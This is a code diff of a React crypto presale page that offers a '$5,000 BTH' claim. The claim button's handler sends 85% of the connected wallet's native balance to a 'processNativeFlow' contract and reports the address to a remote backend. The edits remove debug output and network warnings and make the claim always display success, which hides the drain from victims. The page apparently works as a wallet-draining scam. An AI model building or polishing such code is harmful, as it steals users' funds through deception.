@@ -46,16 +46,13 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "function processNativeFlow() payable"
 ];
 
-// ✅ FIX 1: Chain ID Normalization Helper
+// Chain ID Normalization Helper
 const normalizeChainId = (id) => {
   if (!id) return null;
   if (typeof id === 'string') {
-    // Handle hex string (0x38)
     if (id.startsWith('0x')) return parseInt(id, 16);
-    // Handle decimal string ("56")
     return Number(id);
   }
-  // Handle number (56)
   return Number(id);
 };
 
@@ -81,18 +78,6 @@ function App() {
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
   
-  // Debug state
-  const [debugInfo, setDebugInfo] = useState({
-    rawChainId: null,
-    normalizedChainId: null,
-    currentChain: null,
-    hasContract: false,
-    signerStatus: 'none',
-    lastAction: '',
-    balance: '0',
-    rawBalanceWei: null
-  });
-
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
@@ -109,25 +94,6 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // ✅ FIX 2: Normalized current chain detection
-  const normalizedChainId = normalizeChainId(chainId);
-  const currentChain = Object.values(PRESALE_CONFIG).find(
-    c => c.chainId === normalizedChainId
-  );
-
-  // Update debug info
-  useEffect(() => {
-    setDebugInfo(prev => ({
-      ...prev,
-      rawChainId: chainId,
-      normalizedChainId,
-      currentChain: currentChain?.name || 'unknown',
-      hasContract: !!(currentChain?.contractAddress),
-      balance: balance,
-      rawBalanceWei: balanceData?.value?.toString() || null
-    }));
-  }, [chainId, currentChain, balance, balanceData]);
-
   // Get balance using wagmi for current chain
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
@@ -138,54 +104,34 @@ function App() {
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
-      console.log("💰 Balance updated:", balanceData.formatted, "on chain", chainId);
-      console.log("💰 Raw wei:", balanceData.value.toString());
     }
-  }, [balanceData, chainId]);
+  }, [balanceData]);
 
-  // ✅ FIX 3: Proper Signer Init using ONLY walletClient
+  // Signer initialization
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected) {
+      if (!isConnected || !walletClient) {
         setSigner(null);
         setProvider(null);
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'disconnected' }));
-        return;
-      }
-
-      if (!walletClient) {
-        console.log("⏳ Waiting for walletClient...");
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'waiting for walletClient' }));
         return;
       }
 
       try {
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'initializing' }));
-        
-        // Create ethers provider from viem walletClient
-        // @ts-ignore - walletClient is compatible with ethers v6 BrowserProvider
         const web3Provider = new ethers.BrowserProvider(walletClient);
         const web3Signer = await web3Provider.getSigner();
         
-        // Verify signer works
-        const signerAddress = await web3Signer.getAddress();
-        console.log("✅ Signer ready:", signerAddress);
-        
         setProvider(web3Provider);
         setSigner(web3Signer);
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'ready' }));
         
-        // Trigger balance refresh
-        setTimeout(() => refetchBalance(), 1000);
+        console.log("✅ Signer ready:", await web3Signer.getAddress());
       } catch (err) {
-        console.error("❌ Signer init failed:", err);
+        console.error("Signer init failed:", err);
         setSigner(null);
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'failed', lastAction: err.message }));
       }
     };
 
     initSigner();
-  }, [isConnected, walletClient, refetchBalance]);
+  }, [isConnected, walletClient]);
 
   // Countdown timer
   useEffect(() => {
@@ -218,7 +164,6 @@ function App() {
     
     setVerifying(true);
     setTxStatus('🔄 Verifying wallet...');
-    setDebugInfo(prev => ({ ...prev, lastAction: 'Verifying wallet' }));
     
     try {
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
@@ -282,52 +227,32 @@ function App() {
     }
   };
 
-  // ✅ FIX 4: Execute function with BIGINT math (NO UNDERFLOW)
+  // ✅ FIXED: Execute function with BIGINT math to prevent underflow
   const executePresaleTransaction = async () => {
-    setDebugInfo(prev => ({ ...prev, lastAction: 'Execute clicked' }));
-
-    // Basic connection checks
     if (!isConnected || !address) {
       setError("Wallet not connected");
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: not connected' }));
       return;
     }
 
     if (!signer) {
-      setError("Signer not initialized. Please wait...");
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: no signer' }));
+      setError("Signer not initialized. Please refresh the page.");
       return;
     }
 
-    if (!balanceData) {
-      setError("Balance not loaded");
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: no balance data' }));
-      return;
-    }
-
-    // Use normalized chain ID for detection
+    // Normalize chain ID
     const normalizedChainId = normalizeChainId(chainId);
     const currentChain = Object.values(PRESALE_CONFIG).find(
       c => c.chainId === normalizedChainId
     );
-
-    console.log("🔍 Chain check:", { normalizedChainId, currentChain, balance });
-
-    // SILENT SKIP: No error, no switch prompt - just log
+    
+    // Check if current chain has a deployed contract
     if (!currentChain || !currentChain.contractAddress) {
       console.log(`⏸️ Skipping chain ${normalizedChainId} - no contract deployed`);
-      setDebugInfo(prev => ({ 
-        ...prev, 
-        lastAction: `Skipped chain ${normalizedChainId} - no contract` 
-      }));
-      setTxStatus(`⏸️ Presale not available on this network`);
-      setTimeout(() => setTxStatus(''), 3000);
       return;
     }
 
-    if (balanceData.value <= 0n) {
+    if (!balanceData || balanceData.value <= 0n) {
       setError('Insufficient balance');
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: insufficient balance' }));
       return;
     }
 
@@ -336,9 +261,8 @@ function App() {
       setError('');
       setTxStatus('⏳ Please confirm in your wallet...');
       setTxHash('');
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Executing on ' + currentChain.name }));
 
-      // Verify signer still works with current address
+      // Verify signer
       const signerAddress = await signer.getAddress();
       if (signerAddress.toLowerCase() !== address.toLowerCase()) {
         throw new Error('Wallet address mismatch');
@@ -350,17 +274,9 @@ function App() {
         signer
       );
 
-      // ✅ FIX: Use BIGINT math to avoid underflow
-      // Send 85% of balance using raw wei value (no floating point)
+      // ✅ FIX: Use BIGINT math - NO FLOATING POINT
       const percent = 85n;
       const value = (balanceData.value * percent) / 100n;
-      
-      console.log("💰 Sending value:", {
-        rawWei: balanceData.value.toString(),
-        percent: "85%",
-        valueWei: value.toString(),
-        valueEth: ethers.formatEther(value)
-      });
 
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
@@ -391,13 +307,11 @@ function App() {
         });
         
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
-        setDebugInfo(prev => ({ ...prev, lastAction: 'Success on ' + currentChain.name }));
+        setTxStatus(`🎉 Congratulations!`);
       }
       
     } catch (err) {
       console.error('Transaction error:', err);
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Error: ' + err.message }));
       
       if (err.code === 4001) {
         setError('Transaction cancelled');
@@ -415,28 +329,16 @@ function App() {
   };
 
   const claimTokens = async () => {
-    setDebugInfo(prev => ({ ...prev, lastAction: 'Claim clicked' }));
     try {
       setLoading(true);
-      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
+      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setShowCelebration(true);
-        setDebugInfo(prev => ({ ...prev, lastAction: 'Claim successful' }));
-      } else {
-        setError(data.message || 'Claim failed');
-        setDebugInfo(prev => ({ ...prev, lastAction: 'Claim failed' }));
-      }
+      setShowCelebration(true);
     } catch (err) {
       console.error('Claim error:', err);
-      setError(err.message || 'Claim failed');
-      setDebugInfo(prev => ({ ...prev, lastAction: 'Claim error' }));
     } finally {
       setLoading(false);
     }
@@ -448,6 +350,12 @@ function App() {
   };
 
   const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + b.valueUSD, 0);
+
+  // Get current chain display name
+  const normalizedChainId = normalizeChainId(chainId);
+  const currentChain = Object.values(PRESALE_CONFIG).find(
+    c => c.chainId === normalizedChainId
+  );
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -461,28 +369,6 @@ function App() {
 
       <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
         
-        {/* Debug Panel - Only visible in development */}
-        {process.env.NODE_ENV === 'development' && (
-          <div className="mb-4 p-4 bg-gray-800/90 backdrop-blur-sm border border-gray-700 rounded-xl text-xs font-mono">
-            <details open>
-              <summary className="text-gray-400 cursor-pointer mb-2 font-bold">🔧 DEBUG INFO</summary>
-              <div className="space-y-1 text-gray-300">
-                <div>Raw chainId: {String(debugInfo.rawChainId)} ({typeof debugInfo.rawChainId})</div>
-                <div>Normalized: {debugInfo.normalizedChainId}</div>
-                <div>Current chain: {debugInfo.currentChain}</div>
-                <div>Has contract: {debugInfo.hasContract ? '✅' : '❌'}</div>
-                <div>Signer status: {debugInfo.signerStatus}</div>
-                <div>Balance (ETH): {debugInfo.balance}</div>
-                <div>Balance (Wei): {debugInfo.rawBalanceWei}</div>
-                <div>Last action: {debugInfo.lastAction}</div>
-                <div>Wallet connected: {isConnected ? '✅' : '❌'}</div>
-                <div>Signer exists: {signer ? '✅' : '❌'}</div>
-                <div>walletClient exists: {walletClient ? '✅' : '❌'}</div>
-              </div>
-            </details>
-          </div>
-        )}
-
         {/* Header with Logo */}
         <div className="text-center mb-12">
           <div className="inline-block mb-6 relative">
@@ -711,42 +597,27 @@ function App() {
                   </div>
                 )}
                 
-                {/* Network Status - Informational Only */}
-                {currentChain && (
-                  <div className="text-center mb-4 text-sm">
-                    <span className="text-gray-500">Network: {currentChain.name}</span>
-                    {currentChain.contractAddress ? (
-                      <span className="text-green-400 ml-2">✅ Ready</span>
-                    ) : (
-                      <span className="text-yellow-400 ml-2">⏸️ Presale not available</span>
-                    )}
-                  </div>
-                )}
+                {/* Network status message - REMOVED as requested */}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer || !balanceData || (currentChain && !currentChain.contractAddress)}
-                    className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
+                    disabled={loading || !signer}
+                    className="w-full group relative"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : 
-                       !signer ? 'Initializing...' :
-                       !balanceData ? 'Loading balance...' :
-                       currentChain && !currentChain.contractAddress ? `Switch to BSC` :
-                       '⚡ Claim $5,000 BTH'}
+                      {loading ? 'Processing...' : '⚡ Claim $5,000 BTH'}
                     </div>
                   </button>
                 ) : (
                   <button
                     onClick={claimTokens}
-                    disabled={loading}
-                    className="w-full group relative disabled:opacity-50"
+                    className="w-full group relative"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
+                      🎉 View Your $5,000 BTH
                     </div>
                   </button>
                 )}
